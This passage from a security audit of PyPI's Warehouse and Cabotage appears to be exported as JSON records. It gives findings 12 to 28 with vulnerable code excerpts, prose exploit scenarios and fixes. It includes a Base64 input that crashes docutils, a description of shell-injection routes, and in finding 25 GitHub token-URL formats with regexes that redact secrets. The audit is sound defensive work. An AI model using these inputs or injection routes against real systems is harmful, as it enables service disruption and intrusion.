attackers local abilities.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. HTTP header is silently trusted if token mismatches ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse uses a special header to determine if the request is coming from a trusted proxy. On one hand, If a request contains the X-Warehouse-Token header, and its value matches a shared secret, the code will trust the request and gather information such as the client IP from other special X-Warehouse-* headers. On the other hand, if this X-Warehouse-Token header is not present, Warehouse will gather these details from traditional headers such as X-Forwarded-For . However, this does not account for the special case where the X-Warehouse-Token header is present but its value does not match the shared secret. This is likely an unintended state that may occur if the system is misconguredfor example, if the secret set in the proxy does not match the secret set in the Warehouse deployment. When presented with such a request, the current implementation will silently opt to use the traditional headers, which may result in unexpected behavior. def __call__ ( self , environ, start_response): # Determine if the request comes from a trusted proxy or not by looking # for a token in the request. request_token = environ.get( \"HTTP_WAREHOUSE_TOKEN\" ) if request_token is not None and hmac.compare_digest( self .token, request_token) : # Compute our values from the environment. proto = environ.get( \"HTTP_WAREHOUSE_PROTO\" , \"\" ) remote_addr = environ.get( \"HTTP_WAREHOUSE_IP\" , \"\" ) remote_addr_hashed = environ.get( \"HTTP_WAREHOUSE_HASHED_IP\" , \"\" ) # (...) # If we're not getting headers from a trusted third party via the # specialized Warehouse-* headers, then we'll fall back to looking at # X-Forwarded-* headers, assuming that whatever we have in front of us # will strip invalid ones. else : proto = environ.get( \"HTTP_X_FORWARDED_PROTO\" , \"\" ) # Special case: if we don't see a X-Forwarded-For, this may be a local # development instance of Warehouse and the original REMOTE_ADDR is accurate remote_addr = _forwarded_value( environ.get( \"HTTP_X_FORWARDED_FOR\" , \"\" ) , self .num_proxies ) or environ.get( \"REMOTE_ADDR\" ) # (...) Figure 12.1: The token check is used to determine which headers to trust ( warehouse/warehouse/utils/wsgi.py#5294 ) Exploit Scenario The X-Warehouse-Token secret is refreshed on the Warehouse deployment, but not on the proxy. New requests owing through the proxy use the wrong X-Warehouse-Token value. Warehouse silently starts using the X-Forwarded-For header to determine the remote users address. An attacker uses this fact to forge her IP address and bypass login rate limits. Recommendations Short term, separately handle the case where the header is present but has an unexpected value and report an error or refuse to handle such requests. Such a state is an indication of a system misconguration or a malicious request, both of which should be reported to the system operators.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "13. Bleach library is deprecated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "The readme_renderer library currently sanitizes the rendered README HTML code using the bleach library. On January 23, 2023, the library was declared deprecated : Bleach sits on top of--and heavily relies on--html5lib which is no longer in active development. It is increasingly dicult to maintain Bleach in that context and I think it's nuts to build a security library on top of a library that's not in active development. (...) While the library will continue to receive security updates for the time being, it may not receive new features or support for new standards. Recommendations Short term, look for a suitable alternative under active development and support, and replace bleach with it. Long term, periodically review critical system dependencies and ensure they are supported and receive security patches when required.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "14. Weak hashing in storage backends ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse has multiple implementations of IFileStorage (itself a subclass of IGenericFileStorage ), of which at least two are used in production on PyPI ( B2FileStorage as a hot object store, and S3ArchiveFileStorage as a cold object store). As implementers of IGenericFileStorage , both supply implementations of get_checksum , which in turn returns an object-store-reported MD5 hash for the given path: def get_checksum ( self , path): path = self ._get_path(path) try : return self .bucket.get_file_info_by_id( self .bucket.get_file_info_by_name(path).id_ ).content_md5 except b2sdk.v2.exception.FileNotPresent: raise FileNotFoundError ( f \"No such key: { path !r} \" ) from None Figure 14.1: B2FileStorage.get_checksum ( warehouse/warehouse/packaging/services.py#173180 ) def get_checksum ( self , path): try : return ( self .bucket.Object( self ._get_path(path)).e_tag.rstrip( '\"' ).lstrip( '\"' ) ) except botocore.exceptions.ClientError as exc: if exc.response[ \"ResponseMetadata\" ][ \"HTTPStatusCode\" ] != 404 : # https://docs.aws.amazon.com/AmazonS3/latest/API/API_HeadObject.html#API_HeadObject_R equestBody raise raise FileNotFoundError ( f \"No such key: { path !r} \" ) from None Figure 14.2: GenericS3BlobStorage.get_checksum ( warehouse/warehouse/packaging/services.py#221230 ) These M D5 hashes are used in the asynchronous reconcile_file_storage task to iterate through currently uncached (meaning present only in S3 and not Backblaze B2) les and reconcile the two by updating the cache (and the database to match the caches state). As mentioned in TOB-PYPI-10 , MD5 is an insecure cryptographic digest that is easily collide-able on consumer hardware. As a result, an attacker who is able to compromise either the hot (B2) or cold (S3) object storage and introduce objects with colliding digests may be able to induce confusion during reconciliation between the two, including to the eect of convincing PyPI that the two are reconciled when actually serving les with dierent contents. Exploit Scenario An attacker with write access to either the B2 or S3 object storage inserts new paths with colliding MD5 hashes, or overwrites existing paths to contain new content with colliding MD5 hashes. Subsequent periodic runs of reconcile_file_storage under Warehouse silently succeed, allowing the attacker to persist their maliciously injected objects. This may additionally aect clients that neglect to verify SHA256 distribution hashes. Recommendations We recommend that, where possible, Warehouse employ stronger cryptographic digests for le integrity in each supported le and/or object back end. In particular, we determined that AWS S3 supports SHA256 and that Backblaze B2 supports SHA-1 (which, while stronger than MD5, is also considered broken for any application that requires collision resistance, including digital signatures or le integrity in the presence of malicious modications). Given that the two do not support a common subset of strong cryptographic digests, we note that the above recommendation is not immediately actionable. As a short-term remediation, we recommend that Warehouse utilize each services support for arbitrary metadata to attach a strong cryptographic digest to each object and check that metadata when reconciling between the two. This digest will not present as strong of a guarantee as the ocially supported digests, but it will require the attacker to fully compromise both object stores at once in order to mount an attack, rather than just one.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "15. Uncaught exception with crafted README ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse uses readme_renderer to generate HTML from user-supplied project metadata. readme_renderer uses docutils in its reStructuredText renderer. A docutils bug causes an unhandled IndexError while handling specially crafted inputs. LVU8LAwsCT4= Figure 15.1: The Base64 representation of an input that causes an exception Exploit Scenario An attacker crafts a package with a reStructuredText README, populating the description metadata eld with the contents above, and uploads it to Warehouse. During processing, docutils throws an IndexError , causing Warehouse to reply with a 500 Internal Server Error. As an unhandled exception does not adversely aect users other than the one sending the request or Warehouse as a whole, this nding is informational. Recommendations We recommend that readme_renderer update docutils once a x is released.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "16. ReDoS via zxcvbn-python dependency ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse performs password strength estimation on user passwords, as part of preventing users from choosing unacceptably weak passwords. It uses Dropboxs zxcvbn algorithm to perform password strength estimation, via the zxcvbn-python library. Additionally, Warehouse has a large password length limit: MAX_PASSWORD_SIZE = 4096 Figure 16.1: The Warehouse password length limit ( warehouse/warehouse/accounts/forms.py#44 ) zxcvbn has reported ReDoS vulnerabilities in it; combined with Warehouses large password limit, an attacker could issue contrived passwords during either account registration or password change ows to potentially waste computational and/or memory resources in a Warehouse deployment. Exploit Scenario This nding is purely informational. We believe that it has virtually no impact, like many ReDoS vulnerabilities , due to Warehouses deployment architecture. Recommendations We make no recommendation for this nding.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "17. Use of shell=True in subprocesses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Cabotage denes at least two asynchronous task helpers that invoke Buildkits buildctl (or a wrapper, like buildctl-daemonless.sh ) via the subprocess module to build container images (either for images or dedicated releases): completed_subprocess = subprocess.run( \" \" .join(buildctl_command + buildctl_args), env={ 'BUILDKIT_HOST' : buildkitd_url, 'HOME' : tempdir}, shell= True , cwd=tempdir, check= True , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text= True , ) Figure 17.1: Use of subprocess.run to perform a release build ( cabotage-app/cabotage/celery/tasks/build.py#314319 ) completed_subprocess = subprocess.run( \" \" .join(buildctl_command + buildctl_args), env={ 'BUILDKIT_HOST' : buildkitd_url, 'HOME' : tempdir}, shell= True , cwd= \"/tmp\" , check= True , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text= True , ) Figure 17.2: Use of subprocess.run to perform an image build ( cabotage-app/cabotage/celery/tasks/build.py#658663 ) In both of these cases, subprocess.run is invoked with shell=True , causing the given command to be spawned in a command interpreter rather than directly through the host OSs process creation APIs. This means that the given command is interpreted using the command interpreters (typically POSIX sh ) syntax, which in turn may allow an attacker to inject unintended commands into the executed sequence. In the case of these two image building routes opportunities for injection exist due to the use of user-controlled inputs during argument construction, such as release.repository_name and image.repository_name : f \"type=image,name= { registry } / { release.repository_name } :release- { release.version } ,pus h=true { insecure_reg } \" , Figure 17.3: Command argument construction with user-controlled inputs ( cabotage-app/cabotage/celery/tasks/build.py#119 ) Other sources of user-controllable input may also exist. Exploit Scenario An attacker with the ability to create applications within a Cabotage deployment may be able to contrive an images repository name such that builds created from that image (or releases of that image) run arbitrary shell commands in the context of the orchestrating host. This may in turn allow the attacker to access credentials or resources that are normally only available to Cabotage itself, or move laterally into (or modify) other application containers managed by Cabotage. Recommendations Short term, we recommend removing shell=True from these invocations of subprocess.run . Based on our review, we believe that their use is unnecessary due to a lack of any intentional shell syntax in the build commands. Long term, we recommend evaluating a Python library that can perform image builds without the use of subprocesses. One potential candidate library is docker-py , although it notably does not currently support BuildKit .", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "18. Use of HMAC with SHA1 for GitHub webhook payload validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Cabotage receives various GitHub webhook payloads during normal operation, including for security-sensitive actions like automated deployments. To prevent an attacker from providing a spoofed or inauthentic payload, it veries an HMAC in the payload requests headers against a pre-shared secret: def validate_webhook ( self ): if self .webhook_secret is None : return True return hmac.compare_digest( request.headers.get( 'X-Hub-Signature' ).split( '=' )[ 1 ], hmac.new( self .webhook_secret.encode(), msg=request.data, digestmod=hashlib.sha1).hexdigest() ) Figure 18.1: HMAC computation and comparison ( cabotage-app/cabotage/server/ext/github_app.py#4147 ) The current HMAC construction uses SHA1 as the message digest algorithm. While considered insecure in digital signature schemes due to its lack of collision resistance, SHA1 is not currently considered broken in HMAC constructions (due to HMACs production of an unpredictable intermediate hash state from the shared secret). At the same time, Gi tHub supplies a migration path to HMAC with SHA256, via the X-Hub-Signature-256 header. This header is already present on all webhook payload requests, meaning that webhook-receiving clients do not require any additional conguration to upgrade to a stronger cryptographic digest in their HMAC calculations. Exploit Scenario There are no currently known real-world attacks on HMAC-with-SHA1. As such, we consider this a low-severity nding with high diculty. Recommendations We recommend that Cabotage perform HMAC validation using HMAC-with-SHA256 against X-Hub-Signature-256 .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "19. Potential container image manipulation through malicious Procle ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "During image building, Cabotage collects an images processes by parsing either Procfile.cabotage or Profile at the git SHA ref associated with the build: procfile_body = _fetch_github_file(image.application.github_repository, image.commit_sha, access_token=access_token, filename= 'Procfile.cabotage' ) if procfile_body is None : procfile_body = _fetch_github_file(image.application.github_repository, image.commit_sha, access_token=access_token, filename= 'Procfile' ) if procfile_body is None : raise BuildError( f 'No Procfile.cabotage or Procfile found in root of { image.application.github_repository } @ { image.commit_sha } ' ) image.dockerfile = dockerfile_body image.procfile = procfile_body db.session.commit() #  try : processes = procfile.loads(procfile_body) except ValueError as exc: raise BuildError( f 'error parsing Procfile: { exc } ' ) Figure 19.1: Procle retrieval and parsing ( cabotage-app/cabotage/celery/tasks/build.py#438462 ) The parsed contents of the retrieved Procle are then used to construct a map of envconsul congurations, which are then merged into a Dockerle template: @property def release_build_context_tarfile ( self ): process_commands = \"\\n\" .join([ f 'COPY envconsul- { process_name } .hcl /etc/cabotage/envconsul- { process_name } .hcl' for process_name in self .envconsul_configurations]) dockerfile = RELEASE_DOCKERFILE_TEMPLATE.format(registry=current_app.config[ 'REGISTRY_BUILD' ], image= self .image_object, process_commands=process_commands) if self .dockerfile: dockerfile = self .dockerfile return tarfile_context_for_release( self , dockerfile) @property def release_build_context_configmap ( self ): process_commands = \"\\n\" .join([ f 'COPY envconsul- { process_name } .hcl /etc/cabotage/envconsul- { process_name } .hcl' for process_name in self .envconsul_configurations]) dockerfile = RELEASE_DOCKERFILE_TEMPLATE.format(registry=current_app.config[ 'REGISTRY_BUILD' ], image= self .image_object, process_commands=process_commands) if self .dockerfile: dockerfile = self .dockerfile return configmap_context_for_release( self , dockerfile) Figure 19.2: Construction of COPY directives from envconsul congurations ( cabotage-app/cabotage/server/models/projects.py#544558 ) RELEASE_DOCKERFILE_TEMPLATE = \"\"\" FROM {registry} / {image.repository_name} :image- {image.version} COPY --from=hashicorp/envconsul:0.13.1 /bin/envconsul /usr/bin/envconsul COPY --chown=root:root --chmod=755 entrypoint.sh /entrypoint.sh {process_commands} USER nobody ENTRYPOINT [\"/entrypoint.sh\"] CMD [] \"\"\" Figure 19.3: Dockerle template ( cabotage-app/cabotage/utils/release_build_context.py#816 ) This template is then used to perform an image build for the release. Exploit Scenario Similar to TOB-PYPI-17, an attacker with the ability to create applications within a Cabotage deployment may be able to contrive a Procfile or Procfile.cabotage within a targeted repository such that the build steps on the orchestrating host include unintended or modied Dockerle commands. In a preliminary investigation, we determined that the third-party Procle parser used by Cabotage correctly forbids newlines in process type specications, likely preventing injections of entirely new Dockerle commands. However, other sources of newline injections may still exist. Separately, we determined that Cabotages Procle parser allows non-newline whitespaces in the process type eld: _PROCFILE_LINE = re.compile( '' .join([ r '^(?P<process_type>.+?):\\s*' , r '(?:env(?P<environment>(?:\\s+.+?=.+?)+)\\s+)?' , r '(?P<command>.+)$' , ]) ) Figure 19.4: Whitespace exibility in the third-party Procle parser ( procfile/procfile/__init__.py#1319 ) This may allow an attacker to manipulate the COPY directives specically, including potentially allowing a pivot by copying sensitive materials from the orchestrating host into the attackers image. Recommendations Short term, we recommend that Cabotage perform additional validation on its parsed Procles, including ensuring that the process type eld contains no whitespace or other characters that may change the behavior of the Dockerle template. Long term, we recommend that Cabotage take a more structured approach to Dockerle creation, including potentially evaluating libraries that expose a sanitizing builder pattern for Dockerle commands. Separately, we recommend that Cabotage consider replacing its support for Procles with a well-specied (potentially bespoke) schema, such as jobs specied in a TOML-formatted table, as part of limiting parser ambiguities. We also note that the current third-party Procle parser appears to be unmaintained as of 2015.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "20. Repository confusion during image building ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "As part of image building during deployments, Cabotage uses the _fetch_commit_sha_for_ref helper to retrieve a concrete SHA for a potentially symbolic reference (such as a branch or tag). This helper uses the GitHub REST APIs /repos/{repo}/commits/{ref} endpoint internally, which returns a JSON response containing the concrete SHA: def _fetch_commit_sha_for_ref (github_repository= \"owner/repo\" , ref= \"main\" , access_token= None ): headers = { 'Accept' : 'application/vnd.github+json' , 'X-GitHub-Api-Version' : '2022-11-28' , } if access_token is not None : headers[ 'Authorization' ] = f 'token { access_token } ' response = requests.get( f \"https://api.github.com/repos/ { github_repository } /commits/ { ref } \" , params={ 'ref' : ref }, headers=headers, ) if response.status_code == 404 : return None if response.status_code == 200 : return response.json()[ 'sha' ] response.raise_for_status() Figure 20.1: _fetch_commit_sha_for_ref ( cabotage-app/cabotage/celery/tasks/build.py#377395 ) Because of how GitHub optimizes the object grap h between forks of a repository, this can result in surprising behavior when _fetch_commit_sha_for_ref is called with a SHA reference that belongs to a fork, rather than the spe cied repository: the API call succeeds as if the SHA reference is on the specied repository. This results in a source of exploitable confusion: the GitHub API will return contents for an attacker-controlled fork of a repository with just a SHA reference to the fork, and not the full repository slug. Exploit Scenario An attacker has deployment access to an application on an instance of Cabotage, and wishes to surreptitiously deploy a copy of the application from their malicious forked repository on GitHub rather than the intended repository. By updating the branch setting under deployment automation to contain a SHA from the malicious fork, they are able to confuse the underlying GitHub REST API call into returning contents from their fork, despite no changes to the repository setting itself. Consequently, the attacker is able to deploy from their malicious repository while appearing to deploy from the trusted repository. Recommendations GitHubs internal network model for repository forks makes this dicult to mitigate directly: the /commits/ API does not make a distinction between forks and non-forks in its response, and there appear to be no other public APIs capable of determining whether a SHA ref belongs to a repository versus a potentially malicious fork. As an indirect mitigation, we recommend that _fetch_commit_sha_for_ref be modied to also enumerate the tags and branches for the given repository and compare their SHA refs against the given one, failing if none match. This will prevent an impostor commit, at the cost of several additional REST API round-trips. An example of this procedure can be found in Chainguards clank tool.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "21. Brittle X.509 certicate rewriting ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Cabotage uses Vault as a signing interface. To produce X.509 certicates with signatures from keys that are held by Vault, Cabotage creates a dummy certicate with a discarded private key, and then re-signs the tbsCertificate component using Vaults signing interface. It then squishes the new Vault-created signature into the pre-existing X.509 certicate through a certificate_squisher helper: def certificate_squisher (cert, signature): \"\"\"A kind courtesy of @reaperhulk Function assumes cert is a parsed cryptography x509 cert and that the new signature is of the same type as the one being replaced. Returns a DER encoded certificate. \"\"\" cert_bytes = bytearray (cert.public_bytes(serialization.Encoding.DER)) # Fix the BITSTRING length cert_bytes[- len (cert.signature) - 2 ] = len (signature) + 1 # Fix the SEQUENCE length cert_bytes[ 3 ] += len (signature) - len (cert.signature) return bytes (cert_bytes)[:- len (cert.signature)] + signature def construct_cert_from_public_key (signer, public_key_pem, common_name): dummy_cert = issue_dummy_cert(public_key_pem, common_name) bytes_to_sign = dummy_cert.tbs_certificate_bytes payload = base64.b64encode(bytes_to_sign).decode() signature_bytes = signer(payload) final_certificate_bytes = certificate_squisher(dummy_cert, signature_bytes) final_cert = x509.load_der_x509_certificate( final_certificate_bytes, backend=default_backend(), ) return final_cert.public_bytes( encoding=serialization.Encoding.PEM, ).decode() Figure 21.1: Certicate rewriting and squishing ( cabotage-app/cabotage/utils/cert_hacks.py#4775 ) In most circumstances, this will work correctly (as the new signature will be very close in length to the old dummy signature). However, it is fundamentally brittle: while the signatures own lengths are updated, the DER length encoding is itself variable length and remains unchanged. As a result, an unexpectedly large or small signature here may require a larger or smaller length eld encoding that goes unchanged, meaning that certificate_squisher will silently produce an invalid X.509 certicate. This invalid certicate is then ultimately surfaced, among other places, via the /signing-cert endpoint: @user_blueprint .route( '/signing-cert' , methods=[ 'GET' ]) def signing_cert (): cert = vault.signing_cert raw = request.args.get( \"raw\" , None ) if raw is not None : response = make_response(cert, 200 ) response.mimetype = \"text/plain\" return response return render_template( 'user/signing_cert.html' , signing_certificate=cert) Figure 21.2: The /signing-cert endpoint ( cabotage-app/cabotage/server/user/views.py#12031211 ) Consequently, users of Cabotage may be served an invalid X.509 certicate, producing error states that are not immediately resolvable by either Cabotages operators or clients who rely on it. Exploit Scenario This is an informational nding; an attacker who manages to induce the broken length case will be able to grief users of Cabotage by serving an invalid signing certicate, but otherwise the attacker lacks any useful control over the signing certicates contents. Recommendations We recommend that Cabotage implement the PyCA Cryptography librarys private key interface to perform the signing operation here, allowing the Vault-based signer to transparently interoperate with Cryptographys ordinary X.509 APIs. This interface was not available at the time Cabotage initially added its certicate handling (circa 2017) but has since been stabilized; an example of it can be found at reaperhulk/vault-signing .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "22. Unused dependencies in Cabotage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Cabotages runtime Python dependencies are specied in the top-level requirements.txt le. During a review of Cabotages build and external dependencies, we identied multiple dependencies that are specied but appear to be unused anywhere in Cabotages codebase. These unused dependencies include (but are not limited to):        amqp asn1crypto distlib Babel billard blinker cachetools Some of these unused dependencies may be transitive dependencies, but an absence of hashing in the requirements.txt le indicates that these transitive dependencies are not currently being tracked systematically. Exploit Scenario Python dependencies, when installed as source distributions, are capable of executing arbitrary code at install time. Consequently, an attacker who compromises a dependency of Cabotage may be able to execute arbitrary code in Cabotages build or setup stages, compromising an entire deployment (and all applications hosted within that deployment). Arbitrary code execution during source distribution is an intended feature of the Python packaging ecosystem, so we do not consider it itself to be a security vulnerability; instead, we note that unused dependencies represent an unnecessary increase in Cabotages footprint, giving a potential attacker more attack surface than strictly necessary. This nding is purely informational, as there is no indication that any of the currently unused dependencies specied by Cabotage are malicious. Recommendations We recommend that Cabotages maintainers conduct a review of all dependencies currently listed in requirements.txt and remove all that are not currently required by Cabotage. Moreover, we recommend that Cabotage employ a dependency freezing and hashing tool like pip-compile to maintain a hermetic, fully resolved requirements le.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "23. Insecure XML processing in XMLRPC server ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse exposes an XMLRPC server that can be used to query certain package information. This server is implemented using the xmlrpc package, which is not secure against erroneous or maliciously constructed data. An attacker can craft a request that exploits known weaknesses in the XML parser to cause high CPU and memory consumption, leading to a denial of service. The Python website warns about several issues that can aect the xmlrpc.server module, including exponential entity expansion, quadratic blowup entity expansion, and decompression bombs. The impact of this issue on PyPI would be limited, due to Warehouses deployment architecture. Exploit Scenario An attacker uses the code in appendix D to send a malicious billion laughs XMLRPC request to a Warehouse instance. The Warehouse worker handling the request starts to consume all available memory and signicant amounts of CPU time, and gets killed when the system runs out of memory. Recommendations Short term, ensure that the version of Expat used by Warehouse is 2.4.1 or newer; Pythons ocial documentation notes that versions 2.4.1 and later are not susceptible to billion laughs or quadratic blowup attacks. If a suciently new version of Expat cannot be used, we recommend using the defusedxml package to prevent potentially malicious operations. However, combining the two should not be necessary. Long term, consider deprecating the XMLRPC server in favor of REST APIs. References  XML Processing Modules - XML Vulnerabilities, Python documentation", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "24. Missing resource integrity check of third-party resources ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Several publicly hosted scripts and stylesheets are embedded in the project_application_shell view via <script> and <link> tags. However, these script elements do not contain the integrity attribute. This Subresource Integrity (SRI) feature enables a browser to verify that the linked resources have not been manipulated by an attacker (e.g., one with access to the server hosting the scripts or stylesheets). {% block styles %} {{ super() }} < link rel= \"stylesheet\" href= \"https://cdn.jsdelivr.net/npm/xterm@5.1.0/css/xterm.min.css\" /> {% endblock %} {% block scripts %} < script src= \"https://cdn.jsdelivr.net/npm/xterm@5.1.0/lib/xterm.min.js\" ></ script > < script src= \"https://cdn.jsdelivr.net/npm/xterm-addon-attach@5.0.0-beta.2/lib/xterm-addon-at tach.js\" ></ script > < script src= \"https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.7.0/lib/xterm-addon-fit.min.js\" > </ script > {% endblock %} Figure 24.1: Scripts and stylesheets without integrity hashes ( cabotage-app/cabotage/client/templates/user/project_application_shell.ht ml#211 ) This issue has informational severity, as this view is not enabled by default. Exploit Scenario An attacker compromises the jsDelivr content delivery network and serves a malicious xterm.min.js script. When a Cabotage user interacts with the project_application_shell view, the browser loads and executes the malicious script without checking its integrity. Recommendations Short term, review the codebase for any instances in which the front end loads scripts and stylesheets hosted by third parties and add SRI hashes to those elements. Long term, use static analysis tools such as Semgrep to detect similar issues during the development process. References  Subresource Integrity information, MDN Web Docs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "25. Brittle secret ltering in logs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Cabotage uses a filter_secrets helper to redact secret values, particularly GitHub access tokens appearing in username:password format with x-access-token as the username. def filter_secrets (string): return re.sub( 'x-access-token:.+@github.com' , 'github.com' , string) Figure 25.1: The filter_secrets helper ( cabotage-app/cabotage/utils/logs.py#34 ) However, GitHub is somewhat exible about the structure of access tokens in URLs intended for git access. In particular, each of the following works (where $TOKEN is an access token):  hxxps://$TOKEN@github.com/user/repo.git  hxxps://arbitrary-string-here:$TOKEN@github.com/user/repo.git  hxxps://$TOKEN:x-oauth-basic@github.com/user/repo.git This list is not necessarily exhaustive; other credential formats may be accepted by GitHub. As a result of this exibility, a user or hosted application that makes use of GitHub access tokens in git URLs may have its tokens inadvertently leaked through Cabotages logging facilities. Exploit Scenario An attacker with the ability to monitor logs may observe unredacted GitHub credentials that do not match the current pattern, and may be able to use those credentials to perform unintended GitHub operations (and transitively pivot to a higher privilege on the Cabotage instance). Recommendations We recommend that Cabotage expand the GitHub URL pattern used to scan for secrets, to include anything that appears to have a credentials component. One potential replacement pattern is the following: def filter_secrets (string): return re.sub( '\\S+@github.com' , 'github.com' , string) Figure 25.2: A potential stricter filter_secrets helper This will eectively erase all non-whitespace characters in the authentication component of th e URL, at the small cost of potentially erasing some leading protocol metadata as well (such as https:// ), if present. Alternatively, if Cabotage is able to assert that all tokens used by hosted applications conrm to GitHubs new authentication token formats , Cabotage may choose instead to match on the well-known prexes that GitHub advertises: ghp , gho , ghu , ghs , and ghr . We note, however, that GitHub may choose to expand the list of valid prexes at any point, making this pattern potentially leaky over time. As such, we recommend the previous approach. More generally, we recommend that Cabotage conduct a review of other token formats or sensitive strings that may be leaked through its logging facility. Because the facility appears to be generic and applicable to arbitrary applications deployed through Cabotage, there may not be a generalizable pattern Cabotage can apply; in this case, we recommend that Cabotage expose a facility through which users can specify strings or patterns that should be redacted in their own deployment logs.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "26. Routes missing access controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Cabotage uses Flask-Login to manage user sessions. Flask-Login provides a @login_required decorator that prevents unauthenticated users from accessing views. Most Cabotage views are protected with this decorator, with the exception of release_build_context_tarfile . @user_blueprint .route( '/release/<release_id>/context.tar.gz' ) def release_build_context_tarfile (release_id): 870 871 872 release = Release.query.filter_by( id =release_id).first() 873 874 abort( 404 ) 875 return send_file(release.release_build_context_tarfile, if release is None : as_attachment= True , download_name= f 'context.tar.gz' ) Figure 26.1: The release_build_context_tarfile view ( cabotage-app/cabotage/server/user/views.py#870875 ) Additionally, release_build_context_tarfile does not check if the current user is authorized to access the application associated with the release. As a result, any user with the release ID is able to download the build context associated with the release. Exploit Scenario A Cabotage user leaks a URL containing a release ID to the public, which an attacker then uses to access the /release/<release_id>/context.tar.gz endpoint. The attacker then gains non-public information (e.g., environment variables) about the application from this build context. Recommendations We recommend that Cabotage protects this view with @login_required and ViewApplicationPermission , as is already done for other release views.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "27. Denial-of-service risk on tar.gz uploads ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Warehouse allows users to upload source distributions to the system. These source distributions are uploaded as .tar.gz archives. As part of upload-time metadata validation the archive is decompressed. Because .tar.gz archives can be manipulated to exhibit high compression ratios, this decompression operation may result in high CPU usage on a Warehouse web worker. This is documented in a comment in the code. if filename.endswith( \".tar.gz\" ): # TODO: Ideally Ensure the compression ratio is not absurd # (decompression bomb), like we do for wheel/zip above. # Ensure that this is a valid tar file, and that it contains PKG-INFO. try : with tarfile.open(filename, \"r:gz\" ) as tar: # This decompresses the entire stream to validate it and the # tar within. Easy CPU DoS attack. :/ bad_tar = True member = tar.next() while member: parts = os.path.split(member.name) if len (parts) == 2 and parts[ 1 ] == \"PKG-INFO\" : bad_tar = False member = tar.next() if bad_tar: return False except (tarfile.ReadError, EOFError ): return False Figure 27.1: The stream is decompressed fully, which may cause high CPU usage ( warehouse/warehouse/forklift/legacy.py#694713 ) Like other resource-based denials of services, this is largely mitigated by Warehouses deployment architecture. Consequently, we consider this nding to have informational severity. Exploit Scenario An attacker crafts a relatively small . tar.gz archive with a very high compression ratio and uploads it to Warehouse. The Warehouse web worker handling the upload request decompresses the archive in a streaming fashion while searching for metadata, resulting in high CPU usage until the task either times out or decompression completes. An attacker may upload multiple release distributions in parallel, impeding availability of the upload endpoint for other users. Recommendations This is an informational nding; due to the challenges associated with calculating a zlib streams compression ratio, we make no recommendations around doing so. Long term, we recommend that Warehouse evaluate suitable external memory and CPU time limits on an isolated decompression task via a system interface like setrlimit .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "28. Deployment hook susceptible to race condition due to temporary les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf", "body": "Cabotages process_deployment_hook uses temporary intermediate les to process the contents of the GitHub repository tarball. These les are opened two times in a pattern: a rst open is used to write some contents to the le, then a second open is done to consume those contents for a dierent purpose. An attacker with lesystem access may replace the github_tarball_path le in the lesystem between the two open(...) calls to cause Warehouse to silently operate with a tampered tarball. Likewise, they may replace the release_tarball_path while it is being written to cause Cabotage to upload a dierent le to MinIO. github_tarball_fd, github_tarball_path = tempfile.mkstemp() release_tarball_fd, release_tarball_path = tempfile.mkstemp() try : print ( 'rewriting tarfile... for reasons' ) with open (github_tarball_path, 'wb' ) as handle: for chunk in tarball_request.iter_content( 4096 ): handle.write(chunk) with tarfile.open(github_tarball_path, 'r' ) as github_tarfile: with tarfile.open(release_tarball_path, 